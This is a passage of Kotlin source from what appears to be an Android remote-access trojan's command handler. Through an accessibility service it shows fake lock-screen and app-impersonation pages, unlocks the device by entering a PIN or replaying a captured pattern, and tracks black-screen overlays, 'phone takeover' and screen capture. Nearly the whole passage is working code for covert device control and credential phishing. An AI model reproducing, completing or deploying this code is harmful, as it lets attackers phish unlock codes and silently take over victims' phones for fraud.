                        .put("action", "show_keyguard_fake_page")
                        .put("pageType", pageType.name.lowercase())
                        .put("webUrl", webUrl)
                        .put("keyguardFakeActive", true),
                ),
            )
        } else {
            CommandResult(false, error = result.error ?: "show_keyguard_fake_page_failed")
        }
    }

    private fun executeHideKeyguardFakePage(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }
        val result = AccessibilityControlBridge.hideKeyguardFakePage()
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = appendKeyguardState(
                    JSONObject()
                        .put("action", "hide_keyguard_fake_page")
                        .put("keyguardFakeActive", false),
                ),
            )
        } else {
            CommandResult(false, error = result.error ?: "hide_keyguard_fake_page_failed")
        }
    }

    private fun executeGetKeyguardLockType(): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        val wakeResult = wakeScreenWithAccessibility()
        if (!wakeResult.ok) {
            return CommandResult(
                ok = false,
                error = wakeResult.error ?: "wake_screen_failed",
                data = JSONObject().put("action", "get_keyguard_lock_type"),
            )
        }
        Thread.sleep(WAKE_SETTLE_MS)

        val lockType = AccessibilityControlBridge.queryKeyguardLockType()
            ?: return CommandResult(
                ok = false,
                error = "accessibility_service_not_connected",
                data = JSONObject().put("action", "get_keyguard_lock_type"),
            )

        return CommandResult(
            ok = true,
            data = appendKeyguardState(
                JSONObject()
                    .put("action", "get_keyguard_lock_type")
                    .put("lockType", lockType),
            ),
        )
    }

    private fun executeUnlockPin(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        val lockType = params.optString("lockType").trim().lowercase()
        val gesturePath = params.optString("gesturePath").trim()
            .let { if (it.startsWith("[")) it else "" }
        val pin = params.optString("pin").trim()
        val patternCells = sequenceOf(
            params.optString("path"),
            params.optString("cells"),
            pin,
        ).map { it.trim() }
            .firstOrNull { looksLikePatternCells(it) }
            .orEmpty()

        if (lockType == "pattern" || gesturePath.startsWith("[") || patternCells.isNotEmpty()) {
            return executeUnlockPattern(
                JSONObject()
                    .put("gesturePath", gesturePath)
                    .put("path", patternCells.ifBlank { params.optString("path") })
                    .put("pin", patternCells.ifBlank { pin })
                    .put("cells", patternCells)
                    .put("swipeUp", params.optBoolean("swipeUp", true)),
            )
        }

        if (pin.isBlank()) {
            return CommandResult(false, error = "unlock_pin_requires_pin")
        }

        // mamimobi: WakeLock + WakeOverlay, then unlock path does swipe → settle → digits → OK.
        val wakeResult = wakeScreenWithAccessibility()
        if (!wakeResult.ok && !DeviceStateHelper.isInteractive(context)) {
            return CommandResult(
                ok = false,
                error = wakeResult.error ?: "screen_not_interactive",
                data = appendKeyguardState(JSONObject().put("action", "unlock_pin")),
            )
        }
        Thread.sleep(UNLOCK_WAKE_SETTLE_MS)

        val swipeUp = params.optBoolean("swipeUp", true)
        val result = AccessibilityControlBridge.unlockPin(pin, swipeUp)
        val resultData = appendKeyguardState(
            JSONObject()
                .put("action", "unlock_pin")
                .put("executed", result.ok)
                .put("digitsEntered", result.digitsEntered)
                .put("pinLength", result.pinLength),
        )
        return if (result.ok) {
            CommandResult(ok = true, data = resultData)
        } else {
            CommandResult(
                ok = false,
                error = result.error ?: "unlock_pin_failed",
                data = resultData,
            )
        }
    }

    private fun executeUnlockPattern(params: JSONObject): CommandResult {
        val accessibilityError = ensureControlReady()
        if (accessibilityError != null) {
            return accessibilityError
        }

        var gesturePath = when (val raw = params.opt("gesturePath")) {
            is org.json.JSONArray -> raw.toString()
            is String -> raw.trim()
            else -> ""
        }
        val cellsOnly = params.optBoolean("cellsOnly", false)
        if (gesturePath.isBlank() || gesturePath == "[]" || !gesturePath.startsWith("[")) {
            val alt = params.opt("data")
            gesturePath = when (alt) {
                is org.json.JSONArray -> alt.toString()
                is String -> alt.trim()
                else -> ""
            }
        }
        if (!cellsOnly &&
            (gesturePath.isBlank() || gesturePath == "[]" || !gesturePath.startsWith("["))
        ) {
            gesturePath = gesturePathStore.load()
        }

        val cellsPath = sequenceOf(
            params.optString("cells"),
            params.optString("pin"),
            params.optString("path"),
        ).map { it.trim() }
            .firstOrNull { it.isNotEmpty() && !it.startsWith("[") }
            .orEmpty()

        if ((gesturePath.isBlank() || gesturePath == "[]" || !gesturePath.startsWith("[")) &&
            cellsPath.isBlank()
        ) {
            return CommandResult(false, error = "unlock_pattern_requires_gesture_path")
        }
        if (gesturePath.isBlank() || !gesturePath.startsWith("[")) {
            gesturePath = ""
        }
        if (cellsOnly) {
            gesturePath = ""
        }

        val swipeUp = params.optBoolean("swipeUp", true)
        val inPlaceCellsUnlock =
            cellsOnly &&
                !swipeUp &&
                DeviceStateHelper.isInteractive(context) &&
                AccessibilityControlBridge.isPatternViewVisible()
        if (inPlaceCellsUnlock) {
            android.util.Log.i("PatternCapture", "in-place cells unlock: skip wake")
        } else {
            DeviceStateHelper.holdUnlockWakeLock(context)
        }
        try {
            if (!inPlaceCellsUnlock) {
                val wakeResult = wakeScreenWithAccessibility()
                if (!wakeResult.ok && !DeviceStateHelper.isInteractive(context)) {
                    return CommandResult(
                        ok = false,
                        error = wakeResult.error ?: "screen_not_interactive",
                        data = appendKeyguardState(JSONObject().put("action", "unlock_pattern")),
                    )
                }
                Thread.sleep(UNLOCK_WAKE_SETTLE_MS)
            }

            val result = AccessibilityControlBridge.unlockPattern(gesturePath, cellsPath, swipeUp, cellsOnly)
            val resultData = appendKeyguardState(
                JSONObject()
                    .put("action", "unlock_pattern")
                    .put("executed", result.ok)
                    .put("pointCount", result.digitsEntered)
                    .put("cells", cellsPath)
                    .put("cellsOnly", cellsOnly),
            )
            return if (result.ok) {
                CommandResult(ok = true, data = resultData)
            } else {
                CommandResult(
                    ok = false,
                    error = result.error ?: "unlock_pattern_failed",
                    data = resultData,
                )
            }
        } finally {
            if (!inPlaceCellsUnlock) {
                DeviceStateHelper.releaseUnlockWakeLock()
            }
        }
    }

    private fun prepareScreenInteractionIfNeeded() {
        if (DeviceStateHelper.isInteractive(context)) {
            return
        }
        DeviceStateHelper.wakeScreen(context)
        Thread.sleep(WAKE_SETTLE_MS)
    }

    private fun prepareScreenInteraction() {
        prepareScreenInteractionIfNeeded()
    }

    private fun appendKeyguardState(data: JSONObject): JSONObject {
        DeviceStateHelper.keyguardState(context).forEach { (key, value) ->
            data.put(key, value)
        }
        return data
    }

    private fun ensureControlReady(): CommandResult? {
        if (!AccessibilityHelper.isServiceEnabled(context)) {
            return CommandResult(false, error = "accessibility_not_enabled")
        }
        if (!AccessibilityControlBridge.isReady()) {
            return CommandResult(false, error = "accessibility_service_not_connected")
        }
        return null
    }

    private fun toControlCommandResult(
        action: String,
        result: AccessibilityControlBridge.ControlResult,
    ): CommandResult {
        return if (result.ok) {
            CommandResult(
                ok = true,
                data = JSONObject().put("action", action).put("executed", true),
            )
        } else {
            CommandResult(
                ok = false,
                error = result.error ?: "${action}_failed",
            )
        }
    }

    private fun buildDeviceInfo(): JSONObject {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val rotation = RotationHelper.readState(context)
        return JSONObject()
            .put("androidId", androidId)
            .put("model", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            .put("sdkInt", Build.VERSION.SDK_INT)
            .put("deviceVendor", KeyguardOemProfileRegistry.currentVendor().profileId)
            .put("oemProfile", KeyguardOemProfileRegistry.currentProfileId())
            .put("accessibilityEnabled", AccessibilityHelper.isServiceEnabled(context))
            .put("accessibilityStatus", AccessibilityHelper.getServiceStatus(context))
            .put("accessibilityConnected", AccessibilityStateHolder.isConnected)
            .put("controlReady", AccessibilityControlBridge.isReady())
            .put("screenCaptureSupported", true)
            .put("screenCaptureMode", if (MediaProjectionHolder.hasConsent()) {
                "media_projection"
            } else {
                "media_projection_pending"
            })
            .put("projectionGranted", MediaProjectionHolder.hasConsent())
            .put("blackScreenActive", AccessibilityControlBridge.isBlackScreenActive())
            .put("blackScreenOverlayActive", AccessibilityControlBridge.isBlackScreenActive())
            .put("phoneTakeoverActive", AccessibilityControlBridge.isPhoneTakeoverActive())
            .put("autoRotationEnabled", rotation.enabled)
            .put("writeSettingsGranted", rotation.writeSettingsGranted)
            .also { json ->
                DeviceStateHelper.keyguardState(context).forEach { (key, value) ->
                    json.put(key, value)
                }
            }
    }

    private fun looksLikePatternCells(value: String): Boolean {
        return PATTERN_CELLS_REGEX.matches(value.trim())
    }

    /** Switch config: 1/true=on, 0/false=off. Missing key → defaultOn. */
    private fun parseSwitchOn(params: JSONObject, key: String, defaultOn: Boolean): Boolean {
        if (!params.has(key)) {
            return defaultOn
        }
        return when (val raw = params.opt(key)) {
            is Boolean -> raw
            is Number -> raw.toInt() != 0
            is String -> {
                val text = raw.trim()
                text == "1" || text.equals("true", ignoreCase = true)
            }
            else -> defaultOn
        }
    }

    private class FakePageInput(
        val packageName: String,
        val title: String,
        val content: String,
        val icon: String,
        val pageType: FakePageType,
        val webUrl: String,
        val label: String,
    )

    @Volatile
    private var lastFakePageParseError: String = "fake_page_invalid"

    private fun parseFakePageParams(params: JSONObject, errorPrefix: String): FakePageInput? {
        val packageName = params.optString("packageName").trim()
            .ifBlank { params.optString("package").trim() }
        if (packageName.isBlank()) {
            lastFakePageParseError = "${errorPrefix}_requires_package"
            return null
        }
        val title = params.optString("title").trim()
        val content = params.optString("content").trim()
            .ifBlank { params.optString("body").trim() }
        val icon = params.optString("icon").trim()
        val label = params.optString("label").trim()
            .ifBlank { params.optString("appLabel").trim() }
        val pageTypeRaw = params.optString("pageType").trim()
        val hasPinFallback = parseSwitchOn(params, "hasPin", defaultOn = true)
        val pageType = FakePageType.from(
            raw = pageTypeRaw.ifBlank { null },
            hasPinFallback = hasPinFallback,
        )
        val webUrlRaw = params.optString("webUrl").trim()
            .ifBlank { params.optString("url").trim() }
        val webUrl = if (pageType == FakePageType.WEB) {
            when {
                webUrlRaw.isBlank() -> {
                    lastFakePageParseError = "${errorPrefix}_web_url_required"
                    return null
                }
                !webUrlRaw.startsWith("https://", ignoreCase = true) -> {
                    lastFakePageParseError = "${errorPrefix}_web_url_invalid"
                    return null
                }
                else -> webUrlRaw
            }
        } else {
            ""
        }
        return FakePageInput(
            packageName = packageName,
            title = title,
            content = content,
            icon = icon,
            pageType = pageType,
            webUrl = webUrl,
            label = label,
        )
    }

    private fun hooksToJson(hooks: List<FakePageHookStore.Hook>): JSONArray {
        val array = JSONArray()
        hooks.forEach { array.put(it.toListJson()) }
        return array
    }

    companion object {
        private const val DEFAULT_SWIPE_DURATION_MS = 300L
        private const val WAKE_SETTLE_MS = 150L
        private const val UNLOCK_WAKE_SETTLE_MS = 600L
        private val PATTERN_CELLS_REGEX = Regex("""^\d+([-,]\d+){3,},?$""")
    }
}
